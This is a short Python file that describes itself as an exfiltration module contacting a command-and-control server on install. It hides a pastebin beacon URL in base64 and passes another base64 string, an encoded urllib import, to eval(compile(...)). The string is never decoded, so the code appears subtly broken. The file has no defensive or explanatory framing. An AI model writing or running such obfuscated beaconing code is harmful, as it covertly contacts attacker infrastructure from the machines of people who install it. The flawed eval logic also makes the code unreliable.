"""Exfiltration module — contacts a C2 server on install."""

import base64

# base64 of: https://pastebin.com/raw/beacon789
_ENDPOINT = base64.b64decode("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2JlYWNvbjc4OQ==")

_CODE = "aW1wb3J0IHVybGxpYi5yZXF1ZXN0"
eval(compile(_CODE, "<string>", "exec"))
